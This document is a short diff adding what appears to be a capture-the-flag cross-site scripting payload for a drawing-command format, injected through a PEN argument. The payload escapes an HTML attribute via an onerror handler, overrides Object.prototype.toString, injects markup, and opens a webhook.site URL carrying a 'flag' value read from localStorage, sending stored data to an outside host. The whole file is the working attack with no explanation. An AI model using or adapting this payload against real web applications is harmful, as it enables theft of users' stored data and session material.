@@ -1,0 +1,6 @@
+PEN "x\" onerror=\"Object.prototype.toString=function(){
+    return '</template><base href=/x/;window.parent.open(`https://webhook.site/fc6464ed-8add-4cc3-a201-0f0dfee7b8f2/`+JSON.parse(localStorage.saved).Default.flag)//><template>';
+};
+document.write('<img name=cookie>')\" x="
+
+DRAW_CURVE
